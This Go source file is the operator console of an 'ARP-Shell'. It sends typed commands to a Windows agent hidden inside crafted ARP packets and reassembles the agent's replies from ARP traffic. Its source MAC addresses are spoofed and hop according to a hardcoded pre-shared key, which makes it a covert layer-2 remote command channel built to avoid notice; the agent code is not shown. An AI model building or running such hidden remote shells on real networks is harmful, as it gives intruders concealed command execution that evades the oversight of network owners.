package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"arp-rmm/internal/craft"
	"arp-rmm/internal/fragment"
	"arp-rmm/internal/mac"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const responseTimeout = 30 * time.Second

func main() {
	iface := flag.String("iface", "eth0", "Network interface to use")
	psk := flag.String("psk", "S3cur3_Adm1n_K3y", "Pre-shared key for MAC hopping")
	mvp := flag.Bool("mvp", false, "MVP mode: use static MACs instead of hopping")
	targetMAC := flag.String("target-mac", "00:11:22:33:44:55",
		"Windows agent MAC address (MVP mode filter)")
	flag.Parse()

	handle, err := craft.OpenHandle(*iface, true)
	if err != nil {
		log.Fatalf("Failed to open interface %s: %v", *iface, err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("arp"); err != nil {
		log.Fatalf("Failed to set BPF filter: %v", err)
	}

	reader := bufio.NewReader(os.Stdin)
	currentSeq := 0

	fmt.Println("=== [ Layer 2 ARP-Shell Activated ] ===")
	fmt.Printf("[*] Interface: %s | PSK: Enabled | MVP: %v\n", *iface, *mvp)

	for {
		fmt.Print("\nARP-Admin> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		if input == "exit" || input == "quit" {
			fmt.Println("[*] Exiting ARP Shell.")
			break
		}
		if input == "" {
			continue
		}

		// --- SEND state ---
		fragments := fragment.FragmentCommand(input)
		fmt.Printf("[*] Sending command via %d fragment(s)...\n", len(fragments))

		for _, frag := range fragments {
			var srcMAC net.HardwareAddr
			if *mvp {
				srcMAC = net.HardwareAddr{0x00, 0x11, 0x22, 0x33, 0x44, 0x55}
			} else {
				srcMAC = mac.GenerateHoppedMAC(*psk, currentSeq)
			}

			if err := craft.SendARPRequest(handle, srcMAC, frag); err != nil {
				fmt.Printf("[!] Send error: %v\n", err)
			}
			currentSeq++
			time.Sleep(10 * time.Millisecond)
		}

		// --- LISTEN state ---
		fmt.Println("[*] Waiting for response...")
		response := listenForResponse(handle, *psk, *mvp, *targetMAC, &currentSeq)

		// --- DISPLAY state ---
		fmt.Printf("\n--- RESPONSE ---\n%s\n----------------\n", response)
	}
}

// listenForResponse sniffs for ARP Reply packets from the agent and
// reassembles the fragmented response. In MVP mode it matches by a static
// target MAC; in hopping mode it validates against predicted MACs.
func listenForResponse(handle *pcap.Handle, psk string, mvpMode bool, targetMAC string, seq *int) string {
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	respBuf := fragment.NewCommandBuffer()
	deadline := time.After(responseTimeout)

	for {
		select {
		case <-deadline:
			return "ERR: response timeout (30s)"

		case packet, ok := <-packetSource.Packets():
			if !ok {
				return "ERR: packet source closed"
			}

			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)

			if arp.Operation != layers.ARPReply {
				continue
			}

			srcMAC := net.HardwareAddr(arp.SourceHwAddress).String()

			if !mvpMode {
				expected := mac.PredictNextMAC(psk, *seq)
				if srcMAC != expected {
					continue
				}
			} else if srcMAC != targetMAC {
				continue
			}

			spa := arp.SourceProtAddress
			if len(spa) < 4 {
				continue
			}

			*seq++

			if respBuf.ProcessFragment(spa) {
				return respBuf.Reassemble()
			}
		}
	}
}
